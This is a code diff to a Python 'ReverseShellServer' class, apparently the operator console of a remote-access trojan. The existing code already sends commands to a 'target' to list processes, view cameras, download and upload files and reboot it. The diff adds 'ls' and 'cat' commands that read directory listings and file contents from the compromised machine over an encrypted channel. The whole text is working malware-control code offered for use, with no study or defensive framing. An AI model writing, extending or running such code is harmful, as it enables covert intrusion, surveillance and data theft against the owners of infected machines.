@@ -243,7 +243,7 @@ class ReverseShellServer:
         print(f"{'PID':<8} {'Name':<25} {'User':<20} {'Memory(MB)':<12} {'CPU%':<6}")
         print("-" * 75)
         
-        for proc in processes:
+        for proc in processes[:50]:
             print(f"{proc['pid']:<8} {proc['name'][:24]:<25} {str(proc['user'])[:19]:<20} {proc['memory_mb']:<12} {proc['cpu']:<6}")
 
     def display_network_info(self, network_info):
@@ -275,6 +275,42 @@ class ReverseShellServer:
         
         for cam in cameras:
             print(f"{cam['index']:<8} {cam['resolution']:<20} {cam['fps']:<10} {cam['status']:<15}")
+
+    def display_ls_result(self, data):
+        print("\n" + "="*70)
+        print(f"DIRECTORY LISTING: {data.get('directory', '')}")
+        print("="*70)
+        
+        total_blocks = data.get('total_blocks', 0)
+        print(f"total {total_blocks}")
+        
+        items = data.get("items", [])
+        
+        if not items:
+            print("(empty directory)")
+            return
+        
+        for item in items:
+            if item.get('error'):
+                print(f"?????????? ? ?    ?        ?            ? {item['name']}")
+                continue
+            
+            size_str = str(item['size']).rjust(8)
+            
+            line = (
+                f"{item['permissions']} "
+                f"{str(item['n_links']).rjust(2)} "
+                f"{item['owner']:<8} "
+                f"{item['group']:<8} "
+                f"{size_str} "
+                f"{item['mtime']} "
+                f"{item['name']}"
+            )
+            print(line)
+        
+        dirs = sum(1 for item in items if item.get('is_dir'))
+        files = sum(1 for item in items if not item.get('is_dir'))
+        print(f"\nTotal: {data.get('total', 0)} items ({dirs} directories, {files} files)")
 
     def display_startup_status(self, data):
         print("\n" + "="*50)
@@ -357,6 +393,8 @@ class ReverseShellServer:
         print("battery           - Battery information")
         print("processes         - List running processes")
         print("network           - Network information")
+        print("ls [path]         - List directory contents (like ls -la)")
+        print("cat <path>        - Display file contents")
         print("download <path>   - Download file from target")
         print("upload <local_file> [remote_path] - Upload file to target")
         print("reboot            - Reboot target system")
@@ -475,6 +513,19 @@ class ReverseShellServer:
         elif command.lower() == 'pwd':
             self.send_encrypted(client_sock, {"type": "pwd"})
         
+        elif command.lower().startswith('ls'):
+            parts = command.split()
+            path = None
+            for part in parts[1:]:
+                if not part.startswith('-'):
+                    path = part
+                    break
+            self.send_encrypted(client_sock, {"type": "ls", "command": path})
+        
+        elif command.lower().startswith('cat '):
+            file_path = command[4:].strip()
+            self.send_encrypted(client_sock, {"type": "cat", "command": file_path})
+        
         elif command.lower().startswith('suspend '):
             process_name = command[8:].strip()
             self.send_encrypted(client_sock, {"type": "suspend", "command": process_name})
@@ -488,8 +539,6 @@ class ReverseShellServer:
             self.send_encrypted(client_sock, {"type": "open_page", "command": url})
 
         elif command.lower().startswith('msgbox '):
-            # Format: msgbox Title|Message|type
-            # or just: msgbox Message
             params = command[7:].strip()
             
             if '|' in params:
@@ -625,6 +674,27 @@ class ReverseShellServer:
                     print(f"\n[+] Current directory: {result['current_directory']}")
                 elif "error" in result:
                     print(f"[-] PWD error: {result['error']}")
+            elif "ls_result" in response:
+                result = response["ls_result"]
+                if "items" in result:
+                    self.display_ls_result(result)
+                elif "error" in result:
+                    print(f"[-] LS error: {result['error']}")
+            elif "cat_result" in response:
+                result = response["cat_result"]
+                if "content" in result:
+                    if result.get("is_binary"):
+                        print(f"\n[!] Binary file detected: {result.get('file_name', 'file')}")
+                        print(f"[+] Size: {result.get('file_size', 0)} bytes")
+                        print(f"[+] Content (base64): {result['content'][:200]}...")
+                        print(f"[+] Use 'download {result.get('file_path', '')}' to save the file")
+                    else:
+                        print(f"\n[+] Contents of {result.get('file_name', 'file')} (encoding: {result.get('encoding', 'unknown')}):")
+                        print("-" * 50)
+                        print(result["content"])
+                        print("-" * 50)
+                elif "error" in result:
+                    print(f"[-] Cat error: {result['error']}")
             elif "suspend_result" in response:
                 result = response["suspend_result"]
                 if "suspended_processes" in result:
